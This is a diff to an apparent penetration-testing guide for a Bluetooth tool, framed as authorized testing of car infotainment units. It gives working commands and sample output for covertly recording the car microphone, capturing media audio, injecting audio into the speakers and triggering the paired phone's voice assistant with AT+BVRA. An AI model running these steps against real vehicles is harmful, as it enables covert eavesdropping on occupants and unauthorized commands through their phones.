@@ -138,7 +138,7 @@ $ paplay sessions/ivi-pentest-20260416/audio/recording-20260416-152347.wav
 **Decision point:**
 
 - **If the recording sounds clear** -- the eavesdropping attack is proven. Include the recording (or a screenshot of the waveform) in your report.
-- **If the recording is silent** -- the SCO link may have been established but the microphone isn't active. Some head units only route the microphone during an active call. Try triggering a call first, or use `--action live` (Step 4) to monitor in real time.
+- **If the recording is silent** -- the SCO link may have been established but the microphone isn't active. Some head units only route the microphone during an active call. Trigger a call first (`--action dial --number ...`), then re-run the record action.
 - **If the recording is choppy/distorted** -- RF interference or distance. Move closer to the target. Check for 2.4 GHz Wi-Fi interference.
 
 !!! tip
@@ -146,53 +146,21 @@ $ paplay sessions/ivi-pentest-20260416/audio/recording-20260416-152347.wav
 
 ---
 
-## Step 4: Live Eavesdrop (Real-Time Playback)
+## Step 4: A2DP Media Capture
 
-Stream the target's microphone audio to your speakers in real time:
-
-```bash
-$ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action live
-[*] Establishing HFP SCO connection to AA:BB:CC:DD:EE:FF...
-[*] Codec: mSBC (16 kHz, mono)
-[*] Routing audio to default sink: alsa_output.pci-0000_00_1f.3.analog-stereo
-[*] Live eavesdropping active. Press Ctrl+C to stop.
-[*] Level: ▁▂▃▅▃▂▁▂▃▆▅▃▂▁  Peak: -14.2 dBFS
-```
-
-**What happened:** Same SCO link as recording, but audio is piped directly to your speakers/headphones instead of a file. The level meter shows real-time audio amplitude so you can confirm the microphone is picking up sound.
-
-Press `Ctrl+C` to stop:
+Capture the media audio stream -- whatever music, navigation, or call audio is flowing over the A2DP source endpoint of the target. This uses the `extract stream` subcommand, which operates against the A2DP profile (separate from `extract audio`, which drives HFP/SCO):
 
 ```bash
-^C
-[*] Live eavesdrop stopped.
-[+] Duration: 4m 23s
-[+] No recording saved (live mode).
-```
-
-!!! tip
-    Use headphones to avoid feedback loops. Adjust volume before starting: `pactl set-sink-volume @DEFAULT_SINK@ 80%`
-
----
-
-## Step 5: A2DP Media Capture
-
-Capture the media audio stream -- whatever music, navigation, or call audio is playing through the target's speakers:
-
-```bash
-$ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action capture-media
+$ sudo blue-tap extract AA:BB:CC:DD:EE:FF stream --action record -d 60
 [*] Connecting to A2DP source on AA:BB:CC:DD:EE:FF...
 [*] Codec: SBC (44.1 kHz, stereo)
-[*] Capturing media stream... Press Ctrl+C to stop.
-[*] Capturing: 02:15 elapsed, 23.4 MB written
-^C
-[+] Capture stopped.
-[+] Saved to: sessions/ivi-pentest-20260416/audio/media-capture-20260416-153201.wav
+[*] Capturing media stream for 60s...
+[+] Capture complete.
+[+] Saved to: sessions/ivi-pentest-20260416/audio/a2dp_capture.wav
 
-  File:      media-capture-20260416-153201.wav
-  Duration:  2m 15s
+  File:      a2dp_capture.wav
+  Duration:  60s
   Format:    WAV, 44.1 kHz, stereo, 16-bit
-  Size:      23.4 MB
 ```
 
 **What happened:** Blue-Tap captured the A2DP audio stream at source quality. This records whatever audio the paired phone is sending to the head unit -- music, podcast, navigation voice, or phone call audio routed through the car speakers.
@@ -205,12 +173,12 @@ $ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action capture-media
 
 ---
 
-## Step 6: Audio Injection (Play to Target Speakers)
+## Step 5: Audio Injection (Play to Target Speakers)
 
-Inject an audio file so it plays through the target's speakers:
+Inject an audio file so it plays through the target's A2DP sink. Use the `inject` action of `extract stream` and point `--file` at any decodable WAV/MP3/OGG:
 
 ```bash
-$ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action inject --file alert.wav
+$ sudo blue-tap extract AA:BB:CC:DD:EE:FF stream --action inject --file alert.wav
 [*] Connecting to A2DP sink on AA:BB:CC:DD:EE:FF...
 [*] Codec: SBC (44.1 kHz, stereo)
 [*] Injecting audio: alert.wav (duration: 3.2s, size: 564 KB)
@@ -218,57 +186,29 @@ $ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action inject --file alert.wav
 [+] Audio injection complete.
 ```
 
-**What happened:** The audio file was streamed over A2DP to the target as if it were media from the connected phone. The target's speakers played the injected audio. Supported input formats: WAV, MP3, OGG.
+**What happened:** The audio file was streamed over A2DP to the target as if it were media from the connected phone. The target's speakers played the injected audio.
 
 !!! warning
     Audio injection replaces the current media stream. The target user will hear your injected audio instead of their music. This is immediately noticeable.
 
 ---
 
-## Step 7: Text-to-Speech Injection
+## Step 6: Trigger Voice Assistant via AT Command
 
-Generate speech from text and inject it:
-
-```bash
-$ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action tts \
-    --text "Vehicle security test in progress"
-[*] Generating TTS audio via espeak-ng...
-[*] Generated: 2.8s of audio
-[*] Connecting to A2DP sink on AA:BB:CC:DD:EE:FF...
-[*] Injecting TTS audio...
-[+] TTS injection complete.
-```
-
-**What happened:** Blue-Tap used the local TTS engine to synthesize speech, then injected it over A2DP. The target's speakers spoke the text aloud.
-
-!!! tip
-    Requires `espeak-ng` or `piper-tts` installed. Install with `sudo apt install espeak-ng`.
-
----
-
-## Step 8: Trigger Voice Assistant
-
-Send an AT command to activate the paired phone's voice assistant:
+Send the HFP AT command that activates the paired phone's voice assistant. The `extract at` subcommand executes arbitrary AT commands over the HFP RFCOMM channel:
 
 ```bash
-$ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action voice-assistant --enable
-[*] Sending AT+BVRA=1 over HFP AT command channel...
-[+] Voice assistant activation sent.
+$ sudo blue-tap extract AA:BB:CC:DD:EE:FF at -c "AT+BVRA=1"
+[*] Connecting to HFP service on AA:BB:CC:DD:EE:FF...
+[*] Sending: AT+BVRA=1
+[+] Response: OK
 [*] Target phone should now show voice assistant UI.
 ```
 
-**What happened:** The HFP profile includes AT commands for voice recognition. `AT+BVRA=1` tells the phone to activate its voice assistant (Siri, Google Assistant, Bixby). The phone will open the voice assistant as if the user pressed the microphone button on the steering wheel.
-
-To deactivate:
-
-```bash
-$ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action voice-assistant --disable
-[*] Sending AT+BVRA=0 over HFP AT command channel...
-[+] Voice assistant deactivation sent.
-```
+**What happened:** `AT+BVRA=1` is the standard HFP AT command for voice-recognition activation. The phone opens its voice assistant (Siri, Google Assistant, Bixby) as if the user had pressed the microphone button on the steering wheel. Send `AT+BVRA=0` to deactivate.
 
 !!! danger
-    Triggering the voice assistant on someone's phone can execute commands, make calls, or send messages. Combined with TTS injection over HFP (not A2DP), an attacker could speak commands to the voice assistant through the car's own speakers. Use only in authorized testing.
+    Triggering the voice assistant on someone's phone can execute commands, make calls, or send messages. Combined with A2DP audio injection (Step 5), an attacker can pre-record voice commands and play them through the car's own speakers into the just-activated voice assistant. Use only in authorized testing.
 
 ---
 
@@ -277,31 +217,29 @@ $ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action voice-assistant --disab
 ```
 1. Establish pairing (or leverage existing)
         |
-2. Connect HFP ──────────────────────┐
-        |                             |
-3. Record microphone (passive)   4. Live eavesdrop (real-time)
+2. Connect HFP / verify status
         |
-5. Connect A2DP ──────────────────────┐
-        |                             |
-6. Capture media stream          7. Inject audio / TTS
+3. Record car microphone (extract audio --action record)
         |
-8. Trigger voice assistant (AT+BVRA)
+4. Connect A2DP and capture media (extract stream --action record)
+        |
+5. Inject audio file into A2DP sink (extract stream --action inject)
+        |
+6. Trigger voice assistant via AT+BVRA (extract at -c "AT+BVRA=1")
 ```
 
 ---
 
 ## Summary
 
-This workflow demonstrates the complete audio attack surface over Bluetooth:
+This workflow demonstrates the audio attack surface over Bluetooth:
 
 | Technique | Profile | Direction | Impact |
 |-----------|---------|-----------|--------|
 | Microphone recording | HFP | Target -> Attacker | Eavesdrop on conversations |
-| Live eavesdrop | HFP | Target -> Attacker | Real-time monitoring |
 | Media capture | A2DP | Target -> Attacker | Intercept music/calls/navigation |
 | Audio injection | A2DP | Attacker -> Target | Play arbitrary audio on target speakers |
-| TTS injection | A2DP | Attacker -> Target | Speak arbitrary text through target |
-| Voice assistant | HFP | Attacker -> Phone | Trigger Siri/Google/Bixby remotely |
+| Voice assistant | HFP | Attacker -> Phone | Trigger Siri/Google/Bixby remotely via AT+BVRA |
 
 The key takeaway for clients: once a Bluetooth pairing is established (legitimately or through SSP downgrade), the attacker has full bidirectional audio control -- they can listen, record, inject, and command.
 
@@ -315,7 +253,7 @@ The key takeaway for clients: once a Bluetooth pairing is established (legitimat
 | Recording is silent | Microphone not active | Some IVIs only activate mic during a call; try initiating a call first |
 | Choppy audio | Codec mismatch or RF interference | Move closer to target; check for Wi-Fi on 2.4 GHz band |
 | Injection is silent | A2DP not in sink mode | Verify A2DP connection with `--action status`; reconnect if needed |
-| Voice assistant no response | AT commands unsupported | Target may not support HFP voice recognition; check `--action status` |
+| Voice assistant no response | AT commands unsupported | Target may not support HFP voice recognition; verify HFP with `extract audio --action status` |
 | `parecord` not found | PulseAudio tools missing | `sudo apt install pulseaudio-utils` |
 | Low audio volume | Default sink volume too low | `pactl set-sink-volume @DEFAULT_SINK@ 100%` |
 | Wrong audio device | Multiple sinks/sources | Specify sink: `pactl set-default-sink <name>` |
